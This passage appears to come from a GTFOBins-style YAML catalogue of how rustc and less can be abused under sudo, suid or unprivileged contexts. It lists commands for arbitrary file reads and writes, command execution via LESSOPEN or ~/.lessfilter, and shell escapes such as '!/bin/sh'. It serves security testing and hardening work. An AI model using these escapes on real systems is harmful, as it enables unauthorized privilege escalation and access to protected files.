              comment: The compiler leaks some file lines in the compiler error.
              contexts:
                sudo: null
                unprivileged: null
            file-write:
            - code: 'echo ''fn main() { println!("DATA"); }'' >/path/to/temp-file

                rustc /path/to/temp-file -o /path/to/output-file'
              comment: The comment appears in the compiled program.
              contexts:
                sudo: null
                unprivileged: null
            inherit:
            - code: rustc --explain E0001
              contexts:
                sudo: null
                unprivileged: null
              from: less
        less:
          functions:
            command:
            - code: 'cp /path/to/command ~/.lessfilter

                less /etc/hosts'
              contexts:
                unprivileged: null
            - code: 'LESSOPEN=''/path/to/command # %s'' less /etc/hosts'
              contexts:
                sudo: null
                unprivileged: null
            file-read:
            - code: less /path/to/input-file
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            - code: 'less /etc/hosts

                :e /path/to/input-file'
              comment: This can be used to read another file, e.g., when invoked as a pager with some
                fixed content.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            - code: 'LESSOPEN=''echo /path/to/input-file # %s'' less /etc/hosts'
              comment: This can be used to read another file.
              contexts:
                sudo: null
                unprivileged: null
            file-write:
            - code: 'echo DATA | less

                s/path/to/output-file

                q'
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            inherit:
            - code: 'less /etc/hosts

                v'
              contexts:
                sudo: null
                suid: null
                unprivileged: null
              from: vi
            shell:
            - code: 'less /etc/hosts

                !/bin/sh'
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: 'LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts

                reset'
              comment: The optional `reset` command is needed to receive the echo back of the typed keystrokes.
